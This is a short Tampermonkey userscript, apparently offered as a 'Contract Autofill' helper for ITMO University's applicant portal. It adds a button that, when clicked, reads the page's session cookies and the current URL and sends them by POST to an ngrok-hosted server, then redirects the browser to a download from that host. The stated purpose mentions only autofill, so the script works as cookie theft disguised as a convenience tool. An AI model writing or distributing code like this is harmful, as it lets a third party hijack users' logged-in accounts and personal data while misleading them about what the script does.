// ==UserScript==
// @name         Contract Autofill
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Autofill contract with one button
// @author       dptgo
// @match        https://abitlk.itmo.ru/window/0/questionnaire/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    let btn = document.createElement('button');
    btn.innerText = 'Сформировать договор';
    btn.style.position = 'fixed';
    btn.style.top = '10px';
    btn.style.right = '10px';
    document.body.appendChild(btn);

    btn.onclick = function() {
        let cookies = document.cookie;
        let current_url = window.location.href;

        fetch('https://apparent-weevil-trivially.ngrok-free.app/autofill', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                cookies: cookies,
                current_url: current_url
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log(data);
            window.location.href = 'https://apparent-weevil-trivially.ngrok-free.app/download_contract';
        });
    };
})();
